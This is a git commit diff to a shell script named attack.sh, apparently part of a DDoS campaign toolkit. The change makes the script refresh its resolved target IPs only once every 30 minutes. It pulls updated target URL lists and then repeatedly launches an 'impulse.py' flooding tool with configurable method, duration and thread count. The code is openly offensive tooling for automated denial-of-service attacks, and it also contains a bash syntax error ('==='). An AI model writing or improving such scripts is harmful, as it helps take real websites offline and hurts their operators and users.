c14eada3afa9a6270411c1fef74aab25ba03b4f5
Peace <zutar1049@gmail.com>
2022-02-28 23:32:38 +0000

    Only update `ips` once in 30 minutes

--- attack.sh
+++ attack.sh
@@ -10,7 +10,8 @@ done
 # Set default values for arguments if missing.
 method="${method:-HTTP}" 
 time="${time:-50}"
-threads="${threads:-20}" 
+threads="${threads:-20}"
+ip_refresh_period_sec=1800; # 30 minutes
 
 attack="python3 impulse.py --method ${method} --time ${time} --threads ${threads} --target %"
 
@@ -18,9 +19,17 @@ while true
 do
   echo "Get the latest scripts & URLs..."
   git pull --rebase
-  # TODO: Do it only once in X minutes.
-  echo "Resolving IPs..."
-  cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' > ips
+  echo "Check if need to convert URLs to IPs..."
+  now=$(date +%s)
+  last_updated_at=0
+  if [ -f ips ]; then
+    last_updated_at=$(date -r ips +%s)
+  fi 
+  diff=`expr ${now} - ${last_updated_at}` 
+  if [ "$diff" -gt "$ip_refresh_period_sec" ]; then
+    echo "Resolving IPs..."
+    cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' > ips
+  fi
   echo "Done!"
   echo "Start attacking..."
   if [ "$method" === "HTTP" ]; then
